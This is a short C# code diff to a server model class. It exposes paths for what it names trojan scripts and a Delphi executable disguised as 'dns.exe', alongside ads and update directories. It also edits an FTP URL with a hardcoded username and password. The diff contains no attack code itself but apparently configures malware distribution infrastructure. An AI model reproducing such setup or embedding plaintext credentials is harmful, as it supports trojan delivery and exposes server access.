@@ -18,7 +18,6 @@ namespace model
         [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
         [JsonPropertyName("publishedDynamicDataDir")] public string PublishedDynamicDataDir => ServerModelLoader.PublishedDynamicDataDirStatic;
         [JsonPropertyName("updDir")] public string UpdDir => ServerModelLoader.UpdDirStatic;
-        [JsonPropertyName("updateFile")] public string UpdateFile => Path.Combine(UpdDir, "update.ps1");
         [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
         [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
         [JsonPropertyName("troyanDelphiExe")] public string TroyanDelphiExe => Path.Join(TroyanDelphiDir, "dns.exe");
@@ -36,7 +35,7 @@ namespace model
         [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");
 
         //FTP
-        [JsonPropertyName("ftp")] public string Ftp => $@"ftpX://ftpX:Abc12345!@{Server}";
+        [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
         [JsonPropertyName("ftpAsHttp")] public string FtpAsHttp => $@"http://{Server}/ftp";
         
         
